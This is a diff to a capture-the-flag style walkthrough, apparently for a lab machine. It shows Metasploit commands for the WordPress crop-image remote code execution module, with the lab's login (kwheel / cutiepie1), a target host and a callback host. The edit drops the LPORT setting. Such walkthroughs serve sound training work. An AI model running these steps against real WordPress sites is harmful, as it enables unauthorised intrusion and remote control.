@@ -86,7 +86,7 @@ To use this we need to start up metasploit and search for it using the command `
 
 Then we need to use the exploit by using the command `use exploit/multi/http/wp_crop_rce`.
 
-Now we need to set the parameters, to see them use the command `show options`, for this we need to change the, password, RHOSTS, username, LHOSTS and LPORT, to change these use the command `set password cutiepie1`, `set RHOSTS [IP]`, `set username kwheel`, `set LHOSTS [YOUR IP]` and `set LPORT 4444`.
+Now we need to set the parameters, to see them use the command `show options`, for this we need to change the, password, RHOSTS, username, and LHOSTS, to change these use the commands, `set password cutiepie1`, `set RHOSTS [IP]`, `set username kwheel`, `set LHOSTS [YOUR IP]`.
 
 Now we can use the command `exploit` to run the exploit.
 
